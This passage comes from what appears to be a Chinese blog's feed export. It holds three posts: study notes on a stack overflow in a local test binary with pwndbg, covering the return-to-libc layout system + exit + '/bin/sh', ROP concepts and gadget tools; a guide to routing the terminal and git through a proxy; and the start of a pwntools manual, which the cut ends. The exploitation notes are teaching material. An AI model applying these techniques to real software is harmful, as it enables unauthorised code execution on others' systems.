debugging symbols found)...done.</span><br><span class="line"><span class="meta">pwndbg&gt;</span> r</span><br><span class="line">Starting program: /home/syc/Desktop/test/bof AAAA</span><br><span class="line">argv[1]:AAAA</span><br><span class="line">[Inferior 1 (process 3282) exited normally]</span><br><span class="line"><span class="meta">pwndbg&gt;</span> disassemble main</span><br><span class="line">Dump of assembler code for function main:</span><br><span class="line">   0x5655554d &lt;+0&gt;:lea    ecx,[esp+0x4]</span><br><span class="line">   0x56555551 &lt;+4&gt;:and    esp,0xfffffff0</span><br><span class="line">   0x56555554 &lt;+7&gt;:push   DWORD PTR [ecx-0x4]</span><br><span class="line">   0x56555557 &lt;+10&gt;:push   ebp</span><br><span class="line">   0x56555558 &lt;+11&gt;:mov    ebp,esp</span><br><span class="line">   0x5655555a &lt;+13&gt;:push   ebx</span><br><span class="line">   0x5655555b &lt;+14&gt;:push   ecx</span><br><span class="line">   0x5655555c &lt;+15&gt;:add    esp,0xffffff80</span><br><span class="line">   0x5655555f &lt;+18&gt;:call   0x56555450 &lt;__x86.get_pc_thunk.bx&gt;</span><br><span class="line">   0x56555564 &lt;+23&gt;:add    ebx,0x1a70</span><br><span class="line">   0x5655556a &lt;+29&gt;:mov    eax,ecx</span><br><span class="line">   0x5655556c &lt;+31&gt;:cmp    DWORD PTR [eax],0x1</span><br><span class="line">   0x5655556f &lt;+34&gt;:jg     0x56555578 &lt;main+43&gt;</span><br><span class="line">   0x56555571 &lt;+36&gt;:mov    eax,0x1</span><br><span class="line">   0x56555576 &lt;+41&gt;:jmp    0x565555b1 &lt;main+100&gt;</span><br><span class="line">   0x56555578 &lt;+43&gt;:mov    eax,DWORD PTR [eax+0x4]</span><br><span class="line">   0x5655557b &lt;+46&gt;:add    eax,0x4</span><br><span class="line">   0x5655557e &lt;+49&gt;:mov    eax,DWORD PTR [eax]</span><br><span class="line">   0x56555580 &lt;+51&gt;:sub    esp,0x8</span><br><span class="line">   0x56555583 &lt;+54&gt;:push   eax</span><br><span class="line">   0x56555584 &lt;+55&gt;:lea    eax,[ebp-0x88]</span><br><span class="line">   0x5655558a &lt;+61&gt;:push   eax</span><br><span class="line">   0x5655558b &lt;+62&gt;:call   0x565553e0 &lt;strcpy@plt&gt;</span><br><span class="line">   0x56555590 &lt;+67&gt;:add    esp,0x10</span><br><span class="line">   0x56555593 &lt;+70&gt;:sub    esp,0x8</span><br><span class="line">   0x56555596 &lt;+73&gt;:lea    eax,[ebp-0x88]</span><br><span class="line">   0x5655559c &lt;+79&gt;:push   eax</span><br><span class="line">   0x5655559d &lt;+80&gt;:lea    eax,[ebx-0x1994]</span><br><span class="line">   0x565555a3 &lt;+86&gt;:push   eax</span><br><span class="line">   0x565555a4 &lt;+87&gt;:call   0x565553d0 &lt;printf@plt&gt;</span><br><span class="line">   0x565555a9 &lt;+92&gt;:add    esp,0x10</span><br><span class="line">   0x565555ac &lt;+95&gt;:mov    eax,0x0</span><br><span class="line">   0x565555b1 &lt;+100&gt;:lea    esp,[ebp-0x8]</span><br><span class="line">   0x565555b4 &lt;+103&gt;:pop    ecx</span><br><span class="line">   0x565555b5 &lt;+104&gt;:pop    ebx</span><br><span class="line">   0x565555b6 &lt;+105&gt;:pop    ebp</span><br><span class="line">   0x565555b7 &lt;+106&gt;:lea    esp,[ecx-0x4]</span><br><span class="line">   0x565555ba &lt;+109&gt;:ret    </span><br><span class="line">End of assembler dump.</span><br></pre></td></tr></table></figure><p>在调用<code>strcpy</code>和<code>ret</code>指令处下断点</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">pwndbg&gt;</span> b *0x5655558b</span><br><span class="line">Breakpoint 1 at 0x5655558b</span><br><span class="line"><span class="meta">pwndbg&gt;</span> b *0x565555ba</span><br><span class="line">Breakpoint 2 at 0x565555ba</span><br></pre></td></tr></table></figure><p>开始调试</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">pwndbg&gt;</span> r AAAA</span><br><span class="line">Starting program: /home/syc/Desktop/test/bof AAAA</span><br><span class="line"></span><br><span class="line">Breakpoint 1, 0x5655558b in main ()</span><br><span class="line"> ► 0x5655558b &lt;main+62&gt;     call   strcpy@plt &lt;0x565553e0&gt;</span><br><span class="line">        dest: 0xffffced0 ◂— 0x0</span><br><span class="line">        src: 0xffffd1fd ◂— 'AAAA'</span><br><span class="line"></span><br><span class="line"><span class="meta">pwndbg&gt;</span> x/wx $esp</span><br><span class="line">0xffffcec0:0xffffced00xffffd1fd </span><br><span class="line">//分别是strcpy的两个参数，第一个参数即为目标缓冲区0xffffced0</span><br><span class="line"><span class="meta">pwndbg&gt;</span> c</span><br><span class="line">Continuing.</span><br><span class="line">argv[1]:AAAA</span><br><span class="line"></span><br><span class="line">Breakpoint 2, 0x565555ba in main ()</span><br><span class="line"><span class="meta">pwndbg&gt;</span> x/wx $esp</span><br><span class="line">0xffffcf6c:0xf7df4e81</span><br><span class="line"><span class="meta">pwndbg&gt;</span> p/d 0xffffcf6c - 0xffffced0</span><br><span class="line"><span class="meta">$</span>1 = 156</span><br></pre></td></tr></table></figure><ul><li>在第一个断点处，找到缓冲区起始地址为0xffffced0</li><li>2在第二个断点处，找到缓冲区起始地址为0xffffcf6c</li><li>二者相减可以知道溢出超过140字节时会覆盖返回地址</li></ul><h3 id="pwntools之cyclic"><a href="#pwntools之cyclic" class="headerlink" title="pwntools之cyclic"></a>pwntools之cyclic</h3><p>Cyclic pattern是一个很强大的功能，大概意思就是，使用pwntools生成一个pattern，pattern就是指一个字符串，可以通过其中的一部分数据去定位到他在一个字符串中的位置</p><p>在我们完成栈溢出题目的时候，使用pattern可以大大的减少计算溢出点的时间。<br>用法：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">cyclic(0x100) # 生成一个0x100大小的pattern，即一个特殊的字符串</span><br><span class="line">cyclic_find(0x61616161) # 找到该数据在pattern中的位置</span><br><span class="line">cyclic_find(&apos;aaaa&apos;) # 查找位置也可以使用字符串去定位</span><br></pre></td></tr></table></figure><p>比如，我们在栈溢出的时候，首先构造cyclic(0x100)，或者更长长度的pattern，进行输入，输入后pc的值变味了0x61616161，那么我们通过cyclic_find(0x61616161)就可以得到从哪一个字节开始会控制PC寄存器了，避免了很多没必要的计算</p><h2 id="Return-to-Libc"><a href="#Return-to-Libc" class="headerlink" title="Return to Libc"></a>Return to Libc</h2><p>发生栈溢出时，不跳转到shellcode，而实跳转到libc中的函数</p><h3 id="简单的一个函数"><a href="#简单的一个函数" class="headerlink" title="简单的一个函数"></a>简单的一个函数</h3><p>以调用system函数为例的栈布局</p><table><thead><tr><th align="center"></th><th align="center">0</th></tr></thead><tbody><tr><td align="center"></td><td align="center">“/bin/sh”</td></tr><tr><td align="center"></td><td align="center">exit</td></tr><tr><td align="center">return addr</td><td align="center">system</td></tr><tr><td align="center"></td><td align="center">padding</td></tr></tbody></table><p>system返回时，栈上对应的返回地址为exit()函数，进而执行exit(0)，所以相当于执行了：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">system(<span class="string">"/bin/sh"</span>)</span><br><span class="line"><span class="built_in">exit</span>(<span class="number">0</span>)</span><br></pre></td></tr></table></figure><p>简单来说就是：</p><ul><li>获得system()和exit()的函数地址</li><li>获得”/bin/sh”字符串地址</li><li>构造溢出载荷<ul><li>system + exit + “bin/sh” + 0</li></ul></li><li>实验在关闭ASLR情况下进行，libc函数地址固定不变</li></ul><h4 id="获得system-和exit-的函数地址"><a href="#获得system-和exit-的函数地址" class="headerlink" title="获得system()和exit()的函数地址"></a>获得system()和exit()的函数地址</h4><ul><li>可以在GDB中直接使用print命令查看</li></ul><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">pwndbg&gt;</span> print system</span><br><span class="line"><span class="meta">$</span>1 = &#123;int (const char *)&#125; 0xf7e19200 &lt;__libc_system&gt;</span><br><span class="line"><span class="meta">pwndbg&gt;</span> p exit</span><br><span class="line"><span class="meta">$</span>2 = &#123;void (int)&#125; 0xf7e0c3d0 &lt;__GI_exit&gt;</span><br></pre></td></tr></table></figure><h4 id="获得”-bin-sh”字符串地址"><a href="#获得”-bin-sh”字符串地址" class="headerlink" title="获得”/bin/sh”字符串地址"></a>获得”/bin/sh”字符串地址</h4><p>glibc中必定有字符串”/bin/sh”，可以使用GDB中的find命令，在libc的内存范围内搜索</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">pwndbg&gt;</span> vmmap</span><br><span class="line">LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA</span><br><span class="line">0x56555000 0x56556000 r-xp     1000 0      /home/syc/Desktop/test/bof</span><br><span class="line">0x56556000 0x56557000 r-xp     1000 0      /home/syc/Desktop/test/bof</span><br><span class="line">0x56557000 0x56558000 rwxp     1000 1000   /home/syc/Desktop/test/bof</span><br><span class="line">0xf7ddc000 0xf7fb1000 r-xp   1d5000 0      /lib/i386-linux-gnu/libc-2.27.so</span><br><span class="line">0xf7fb1000 0xf7fb2000 ---p     1000 1d5000 /lib/i386-linux-gnu/libc-2.27.so</span><br><span class="line">0xf7fb2000 0xf7fb4000 r-xp     2000 1d5000 /lib/i386-linux-gnu/libc-2.27.so</span><br><span class="line">0xf7fb4000 0xf7fb5000 rwxp     1000 1d7000 /lib/i386-linux-gnu/libc-2.27.so</span><br><span class="line">0xf7fb5000 0xf7fb8000 rwxp     3000 0      </span><br><span class="line">0xf7fd0000 0xf7fd2000 rwxp     2000 0      </span><br><span class="line">0xf7fd2000 0xf7fd5000 r--p     3000 0      [vvar]</span><br><span class="line">0xf7fd5000 0xf7fd6000 r-xp     1000 0      [vdso]</span><br><span class="line">0xf7fd6000 0xf7ffc000 r-xp    26000 0      /lib/i386-linux-gnu/ld-2.27.so</span><br><span class="line">0xf7ffc000 0xf7ffd000 r-xp     1000 25000  /lib/i386-linux-gnu/ld-2.27.so</span><br><span class="line">0xf7ffd000 0xf7ffe000 rwxp     1000 26000  /lib/i386-linux-gnu/ld-2.27.so</span><br><span class="line">0xfffdd000 0xffffe000 rwxp    21000 0      [stack]</span><br><span class="line"><span class="meta">pwndbg&gt;</span> find /b 0xf7ddc000, 0xf7fb5000,'/','b','i','n','/','s','h',0</span><br><span class="line">0xf7f5a0cf</span><br><span class="line">1 pattern found.</span><br><span class="line"><span class="meta">pwndbg&gt;</span> x/s 0xf7f5a0cf</span><br><span class="line">0xf7f5a0cf:"/bin/sh"</span><br></pre></td></tr></table></figure><p>0xf7ddc000是libc起始地址，0xf7fb5000是结尾地址</p><h4 id="获取地址的另一种方法"><a href="#获取地址的另一种方法" class="headerlink" title="获取地址的另一种方法"></a>获取地址的另一种方法</h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">syc@ubuntu:~/Desktop/test$ ldd bof</span><br><span class="line">linux-gate.so.1 (0xf7eff000)</span><br><span class="line">libc.so.6 =&gt; /lib/i386-linux-gnu/libc.so.6 (0xf7d03000)</span><br><span class="line">/lib/ld-linux.so.2 (0xf7f00000)</span><br><span class="line">syc@ubuntu:~/Desktop/test$ readelf -s /lib/i386-linux-gnu/libc.so.6 | grep system</span><br><span class="line">   ...</span><br><span class="line">  1510: 0003d200    55 FUNC    WEAK   DEFAULT   13 system@@GLIBC_2.0</span><br><span class="line">syc@ubuntu:~/Desktop/test$ readelf -s /lib/i386-linux-gnu/libc.so.6 | grep exit</span><br><span class="line">   ...</span><br><span class="line">   147: 000303d0    33 FUNC    GLOBAL DEFAULT   13 exit@@GLIBC_2.0</span><br><span class="line">   ...</span><br><span class="line">syc@ubuntu:~/Desktop/test$ strings -tx  /lib/i386-linux-gnu/libc.so.6 | grep /bin/sh</span><br><span class="line"> 17e0cf /bin/sh</span><br><span class="line"> syc@ubuntu:~/Desktop/test$ gdb -q</span><br><span class="line">pwndbg: loaded 179 commands. Type pwndbg [filter] for a list.</span><br><span class="line">pwndbg: created $rebase, $ida gdb functions (can be used with print/break)</span><br><span class="line"><span class="meta">pwndbg&gt;</span> p/x 0xf7d03000 + 0x0003d200</span><br><span class="line"><span class="meta">$</span>1 = 0xf7d40200</span><br><span class="line"><span class="meta">pwndbg&gt;</span> p/x 0xf7d03000 + 0x000303d0</span><br><span class="line"><span class="meta">$</span>2 = 0xf7d333d0</span><br><span class="line"><span class="meta">pwndbg&gt;</span> p/x 0xf7d03000 + 0x017e0cf</span><br><span class="line"><span class="meta">$</span>3 = 0xf7e810cf</span><br></pre></td></tr></table></figure><ul><li>首先用ldd命令获取libc基址</li><li>然后用readelf命令找到system和exit函数在libc中的偏移</li><li>用strings命令找到字符串/bin/sh在libc中的偏移</li><li>最后通过与libc基址相加来获得最终地址</li></ul><p>有时候我们会发现”/bin/sh”的地址中包含换行符0a，argv[1]会被换行符截断，解决方案：使用”sh\0”</p><p>可以更换一个命令字符串，一般来说PATH环境变量中已经包含/bin目录，因此只需要找到一个”sh”字符串，将其地址作为system()函数的参数即可。</p><p>我们在程序自身空间内就可以找到”sh”这个字符串，同样使用find命令。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">pwndbg&gt;</span> find /b 0xf7ddc000, 0xf7fb5000, 's','h',0</span><br><span class="line">0xf7deacd3</span><br><span class="line">0xf7dead32</span><br><span class="line">0xf7debe59</span><br><span class="line">0xf7dec4ac</span><br><span class="line">0xf7dee4f6</span><br><span class="line">0xf7dee5d3</span><br><span class="line">0xf7deee85</span><br><span class="line">0xf7def172</span><br><span class="line">0xf7f573b5 &lt;__re_error_msgid+117&gt;</span><br><span class="line">0xf7f57dc1 &lt;afs.8574+193&gt;</span><br><span class="line">0xf7f5a0d4</span><br><span class="line">0xf7f5bacd</span><br><span class="line">12 patterns found.</span><br><span class="line"><span class="meta">pwndbg&gt;</span> x/s 0xf7deacd3</span><br><span class="line">0xf7deacd3:"sh"</span><br></pre></td></tr></table></figure><h2 id="Return-to-PLT"><a href="#Return-to-PLT" class="headerlink" title="Return to PLT"></a>Return to PLT</h2><ul><li>如果动态共享库的地址随机化保护开启，则无法知道libc地址</li><li>而程序中已经引用的动态库函数，可以直接通过PLT调用，无需知道实际地址</li></ul><h2 id="重新思考Return-to-Libc"><a href="#重新思考Return-to-Libc" class="headerlink" title="重新思考Return to Libc"></a>重新思考Return to Libc</h2><ul><li>利用Return to Libc，我们调用了system(“/bin/sh”)和exit(0)</li><li>system()和exit()函数本质上都是以ret指令结尾的代码片段</li><li>那如果其他ret结尾的代码片段呢？例如几条指令组成的小代码片段。同样可行！</li></ul><h2 id="ROP（Return-Oriented-Programming）"><a href="#ROP（Return-Oriented-Programming）" class="headerlink" title="ROP（Return Oriented Programming）"></a>ROP（Return Oriented Programming）</h2><ul><li>通过拼接以ret指令结尾的代码片段来实现某些功能的技术，称为ROP</li><li>以ret指令结尾的小段代码片段我们称为ROP gadget：例如：pop edx;ret</li><li>为实现某-功能拼接而成的多个ROP gadget,我们称为ROP链(ROP Chain）</li><li>在栈上(从返回地址开始)填充的用于执行ROP链的数据，我们称为ROP载荷(ROP Payload)</li><li>ROP技术是Return to libc的扩 展，Return to libc是ROP的一 种特殊情况，即ROP gadget恰好是libc函数的情形</li></ul><h2 id="ROP的扩展-JOP、COP"><a href="#ROP的扩展-JOP、COP" class="headerlink" title="ROP的扩展-JOP、COP"></a>ROP的扩展-JOP、COP</h2><ul><li>换汤不换药，把使用的的代码片段从ret结尾拓展到jmp/call结尾</li><li>JOP（Jump Oriented Programming）<ul><li>pop esi ; jmp dword [esi-0x70]</li></ul></li><li>COP（Call Oriented Programming）<ul><li>mov edx,dowrd [esp+0x48] ; call doword [eax+0x10]</li></ul></li></ul><h2 id="ROP-Gadget-搜索工具"><a href="#ROP-Gadget-搜索工具" class="headerlink" title="ROP Gadget 搜索工具"></a>ROP Gadget 搜索工具</h2><ul><li>ROPGadget<ul><li><a href="https://github.com/JonathanSalwan/ROPgadget" target="_blank" rel="noopener">https://github.com/JonathanSalwan/ROPgadget</a></li></ul></li><li>rp<ul><li><a href="https://github.com/0vercl0k/rp" target="_blank" rel="noopener">https://github.com/0vercl0k/rp</a></li></ul></li><li>ropper<ul><li><a href="https://github.com/sashs/Ropper" target="_blank" rel="noopener">https://github.com/sashs/Ropper</a></li></ul></li><li>xrop<ul><li><a href="https://github.com/acama/xrop" target="_blank" rel="noopener">https://github.com/acama/xrop</a></li></ul></li></ul>]]></content>
      
      
      <categories>
          
          <category> 长亭PWN笔记 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Linux让终端走代理的几种方法</title>
      <link href="/2020/04/21/Linux%E2%95%9A%E2%94%9C%E2%95%93%E2%95%92%E2%95%A2%E2%95%A6%E2%95%AB%E2%96%80%E2%94%A4%C2%B7%E2%94%94%CF%86%E2%95%A1%E2%94%80%E2%95%9D%E2%95%95%E2%95%93%E2%95%93%E2%95%96%E2%95%9C%E2%95%96%C2%BF/"/>
      <url>/2020/04/21/Linux%E2%95%9A%E2%94%9C%E2%95%93%E2%95%92%E2%95%A2%E2%95%A6%E2%95%AB%E2%96%80%E2%94%A4%C2%B7%E2%94%94%CF%86%E2%95%A1%E2%94%80%E2%95%9D%E2%95%95%E2%95%93%E2%95%93%E2%95%96%E2%95%9C%E2%95%96%C2%BF/</url>
      
        <content type="html"><![CDATA[<p>最近使用终端git的时候觉得速度有点慢，考虑一下是不是可以通过让终端走代理的方式来加快速度，尝试了一下以后确实是可以的。如果只是为了设置git的话可以直接在文章最后找到git的设置代理的方法。</p><p><strong>前期准备:</strong></p><p>认识代理的方式:代理是通过客户端与服务端通信,传输服务端能够访问到的资源文件,再由服务端客户端通信返回给客户端,从而间接访问服务端能访问的资源.</p><p>以socket5通信为例子,我们通过客户端(自己想一想酸酸乳)向服务端发送socket通信,服务端访问资源再由socket通信返回给客户端.但是这里面的通信设置必须通过端口来进行通信,类似switchyomega设置过程一样,我们会设定走的代理方式是127.0.0.1:1080;这个意思就是通过本地的1080端口来进行通信.具体在终端上如何使用呢?</p><ul><li>如果默认是socket5通信且端口是1080,即127.0.01:1080的方式</li></ul><p>使用如下两种方式</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">socks5://127.0.0.1:1080</span><br></pre></td></tr></table></figure><p>这里无关自己代理客户端是不是酸酸乳或酸酸只要是通过socket通信即可,前提是满足已经能够正常代理访问.</p><ul><li>第二种是http代理,即通信方式为http而不是socket</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1:12333</span><br></pre></td></tr></table></figure><h2 id="方法一：（推荐使用）"><a href="#方法一：（推荐使用）" class="headerlink" title="-方法一：（推荐使用）"></a>-方法一：（推荐使用）</h2><blockquote><p> 为什么说这个方法推荐使用呢？因为他只作用于当前终端中，不会影响环境，而且命令比较简单</p></blockquote><p>在终端中直接运行：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">export http_proxy=http://proxyAddress:port</span><br></pre></td></tr></table></figure><p>如果你是SSR,并且走的http的代理端口是12333，想执行wget或者curl来下载国外的东西，可以使用如下命令：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">export http_proxy=http://127.0.0.1:12333</span><br></pre></td></tr></table></figure><p>如果是https那么就经过如下命令：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">export https_proxy=http://127.0.0.1:12333</span><br></pre></td></tr></table></figure><h2 id="方法二-："><a href="#方法二-：" class="headerlink" title="方法二 ："></a>方法二 ：</h2><blockquote><p> 这个办法的好处是把代理服务器永久保存了，下次就可以直接用了</p></blockquote><p>把代理服务器地址写入shell配置文件.bashrc或者.zshrc 直接在.bashrc或者.zshrc添加下面内容</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">export http_proxy=&quot;http://localhost:port&quot;</span><br><span class="line">export https_proxy=&quot;http://localhost:port&quot;</span><br></pre></td></tr></table></figure><p>或者走socket5协议（ss,ssr）的话，代理端口是1080</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">export http_proxy=&quot;socks5://127.0.0.1:1080&quot;</span><br><span class="line">export https_proxy=&quot;socks5://127.0.0.1:1080&quot;</span><br></pre></td></tr></table></figure><p>或者干脆直接设置ALL_PROXY</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">export ALL_PROXY=socks5://127.0.0.1:1080</span><br></pre></td></tr></table></figure><p>最后在执行如下命令应用设置</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">source ~/.bashrc</span><br></pre></td></tr></table></figure><p>或者通过设置alias简写来简化操作，每次要用的时候输入setproxy，不用了就unsetproxy。</p><figure class="highlight console"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">alias setproxy="export ALL_PROXY=socks5://127.0.0.1:1080" alias unsetproxy="unset ALL_PROXY"</span><br></pre></td></tr></table></figure><h2 id="方法三"><a href="#方法三" class="headerlink" title="方法三:"></a>方法三:</h2><p>改相应工具的配置，比如apt的配置</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo vim /etc/apt/apt.conf</span><br></pre></td></tr></table></figure><p>在文件末尾加入下面这行</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Acquire::http::Proxy &quot;http://proxyAddress:port&quot;</span><br></pre></td></tr></table></figure><blockquote><p> 重点来了！！如果说经常使用git对于其他方面都不是经常使用，可以直接配置git的命令。</p></blockquote><h2 id="使用ss-ssr来加快git的速度"><a href="#使用ss-ssr来加快git的速度" class="headerlink" title="使用ss/ssr来加快git的速度"></a>使用ss/ssr来加快git的速度</h2><p>直接输入这个命令就好了</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">git config --global http.proxy &apos;socks5://127.0.0.1:1080&apos; </span><br><span class="line">git config --global https.proxy &apos;socks5://127.0.0.1:1080&apos;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> Linux杂记 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>PWNTOOLS个人手册</title>
      <link href="/2020/04/18/PWNTOOLS%E2%95%95%C3%B7%E2%95%9A%E2%95%A6%E2%95%A9%E2%95%93%E2%96%93%C3%9F/"/>
      <url>/2020/04/18/PWNTOOLS%E2%95%95%C3%B7%E2%95%9A%E2%95%A6%E2%95%A9%E2%95%93%E2%96%93%C3%9F/</url>
      
        <content type="html"><![CDATA[<p>项目主页：<a href="http://pwntools.com/" target="_blank" rel="noopener">http://pwntools.com/</a></p><p>项目地址：<a href="https://github.com/Gallopsled/pwntools" target="_blank" rel="noopener">https://github.com/Gallopsled/pwntools</a></p><h2 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">＃更新包</span><br><span class="line">sudo apt-get update</span><br><span class="line">＃安装必要的组件</span><br><span class="line">sudo apt-get install -y python2.7 python -pip python-dev git libssl-dev libffi-dev build-essential</span><br><span class="line">＃升级Python的包管理器</span><br><span class="line">pip install --upgrade pip</span><br><span class="line">＃安装pwntools </span><br><span class="line">sudo pip install --upgrade pwntools</span><br></pre></td></tr></table></figure><h2 id="模块列表"><a href="#模块列表" class="headerlink" title="模块列表"></a>模块列表</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">- pwnlib.adb — Android Debug Bridge</span><br><span class="line">- pwnlib.asm — Assembler functions</span><br><span class="line">- pwnlib.encoders — Encoding Shellcode</span><br><span class="line">- pwnlib.elf — ELF Executables and Libraries</span><br><span class="line">- pwnlib.exception — Pwnlib exceptions</span><br><span class="line">- pwnlib.flag — CTF Flag Management</span><br><span class="line">- pwnlib.fmtstr — Format string bug exploitation tools</span><br><span class="line">- pwnlib.gdb — Working with GDB</span><br><span class="line">- pwnlib.log — Logging stuff</span><br><span class="line">- pwnlib.protocols — Wire Protocols</span><br><span class="line">- pwnlib.rop — Return Oriented Programming</span><br><span class="line">- pwnlib.runner — Running Shellcode</span><br><span class="line">- pwnlib.shellcraft — Shellcode generation</span><br><span class="line">- pwnlib.shellcraft.&lt;architecture&gt;</span><br><span class="line">- pwnlib.term — Terminal handling</span><br><span class="line">- pwnlib.timeout — Timeout handling</span><br><span class="line">- pwnlib.tubes — Talking to the World!</span><br><span class="line">- pwnlib.tubes.&lt;process|serialtube|SSH&gt;</span><br><span class="line">- pwnlib.update — Updating Pwntools</span><br><span class="line">- pwnlib.useragents — A database of useragent strings</span><br><span class="line">- pwnlib.util.cyclic — Generation of unique sequences</span><br><span class="line">- pwnlib.util.fiddling — Utilities bit fiddling</span><br><span class="line">- pwnlib.util.net — Networking interfaces</span><br><span class="line">- pwnlib.util.packing — Packing and unpacking of strings</span><br></pre></td></tr></table></figure><h2 id="使用"><a href="#使用" class="headerlink" title="使用"></a>使用</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br></pre></td></tr></table></figure><h2 id="模块介绍"><a href="#模块介绍" class="headerlink" title="模块介绍"></a>模块介绍</h2><p><strong>常用模块如下：</strong></p><ul><li>asm : 汇编与反汇编，支持x86/x64/arm/mips/powerpc等基本上所有的主流平台</li><li>dynelf : 用于远程符号泄漏，需要提供leak方法</li><li>elf : 对elf文件进行操作</li><li>gdb : 配合gdb进行调试</li><li>memleak : 用于内存泄漏</li><li>shellcraft : shellcode的生成器</li><li>tubes : 包括tubes.sock, tubes.process, tubes.ssh, tubes.serialtube，分别适用于不同场景的PIPE</li><li>utils : 一些实用的小功能，例如CRC计算，cyclic pattern等</li></ul><h3 id="链接"><a href="#链接" class="headerlink" title="链接"></a>链接</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">本地 ：sh = porcess(&quot;./level0&quot;)</span><br><span class="line">远程：sh = remote(&quot;127.0.0.1&quot;,10001)</span><br><span 